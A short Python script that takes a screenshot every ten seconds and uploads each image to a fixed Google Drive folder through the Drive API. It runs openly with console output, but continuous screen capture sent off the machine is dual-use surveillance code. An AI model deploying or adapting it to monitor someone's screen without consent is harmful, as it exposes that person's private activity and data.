# you need to install pyautogui
# pip install pyautogui

# for screenshot
import pyautogui

# for google drive
from googleapiclient.http import MediaFileUpload
from Google import Create_Service

# miscellaneous
import time
from os import listdir
from os.path import isfile, join
import os
# ====================================== Global variables - Google Drive ======================================
# Google's client instance
CLIENT_SECRET_FILE = 'Client_Secret_File.json'
API_NAME = 'drive'
API_VERSION = 'v3'
# this has all the permissions and scopes inside
SCOPES = ['https://www.googleapis.com/auth/drive']

# creates the Google 
service = Create_Service(CLIENT_SECRET_FILE, API_NAME, API_VERSION, SCOPES)

# uploading file and picture: https://developers.google.com/drive/api/v3/reference/files/create
# google drive folder ids
# you find this in the folder's url
screenshot_folder_id = '1ceqrIS32xrWfwrcGfkCXacU9UVev4NOY'

file_log = ["log.txt"]
# you need to find the folder, read their names then loop through them

# https://learndataanalysis.org/commonly-used-mime-types/
# mime_types = ['text/plain', 'image/png']


# ====================================== Helper functions - Screenshot   ======================================
def send_picture(screenshot_name):
    sn = screenshot_name.replace('screenshot\\', '')
    mime_type = 'image/png'
    file_metadata = {
        'name': sn,
        'parents': [screenshot_folder_id]
    }

    media = MediaFileUpload(screenshot_name, mimetype=mime_type)

    service.files().create(
        body=file_metadata,
        media_body=media,
        fields='id'
    ).execute()


# ====================================== Helper functions - Google Drive ======================================
# gets all the screen shots in the folder then pass it to send_pictures
def get_screenshot_names():
    return [f for f in listdir('./screenshots/') if isfile(join('./screenshots', f))]

# takes a list of local photo names then send it to the google drive
def send_pictures(screenshot_names):
    print("my screenshot folder "+str(screenshot_names))
    mime_type = 'image/png'
    for screenshot_name in screenshot_names:
        print("hello " +screenshot_name)
        file_metadata = {
            'name': screenshot_name,
            'parents': [screenshot_folder_id]
        }
        print("hello "+'./screenshots/{0}'.format(screenshot_name))
        media = MediaFileUpload('./screenshots/{0}'.format(screenshot_name), mimetype=mime_type)
        # media = MediaFileUpload('./screenshots/01', mimetype=mime_types)

        service.files().create(
            body=file_metadata,
            media_body=media,
            fields='id'
        ).execute()
        

def screenshot():
    while True:
        current_time = time.localtime()
        # format the time to look nicer
        formatted_time = time.strftime("%I %M %S %p", current_time)
        print(formatted_time)
        sshot = pyautogui.screenshot() 
        sshot_name = 'screenshots\\'+ str(formatted_time)+'.png'
        sshot.save(sshot_name)
        # get the screen shot then send it to the drive
        send_picture(sshot_name)
        time.sleep(10)

# git won't take an empty file. Makes a folder called screenshots 
try:
    os.makedirs('screenshots')    
    print("Make screenshots folder")
except FileExistsError:
    print("screenshots already exists")  

screenshot()


